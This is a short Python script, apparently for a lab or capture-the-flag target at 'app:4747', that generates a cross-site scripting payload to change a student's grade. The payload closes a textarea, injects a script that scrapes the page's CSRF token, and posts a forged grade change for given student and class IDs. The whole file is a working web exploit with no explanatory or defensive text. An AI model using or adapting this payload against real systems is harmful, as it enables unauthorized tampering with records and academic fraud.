# creates payloads for grade changes

import urllib.parse


def make_payload(student_id, class_id, grade="B"):
    inner_js = f"""fetch('/grade-change')
.then(r => r.text())
.then(h => {{
    let d = new DOMParser().parseFromString(h,'text/html');
    let t = d.querySelector('input[name=csrf_token]').value;
    fetch('/grade-change',{{
        method:'POST',
        headers:{{'Content-Type':'application/x-www-form-urlencoded'}},
        body:`student_id={student_id}&class_id={class_id}&grade={grade}&csrf_token=${{t}}`
    }})
}})"""


    wrapped = f"</textarea><script src=\"data:,{inner_js}\"></script>"
    # return urllib.parse.quote(wrapped)
    return wrapped


if __name__ == "__main__":
    student_id = "f7653007-eda1-4402-8a47-c834d56e0bf3"
    class_id   = "296336d8-718a-49ff-a537-50cfcf038258"
    grade      = "A"
    base_url   = "http://app:4747"

    payload = make_payload(student_id, class_id, grade)
    print(payload)

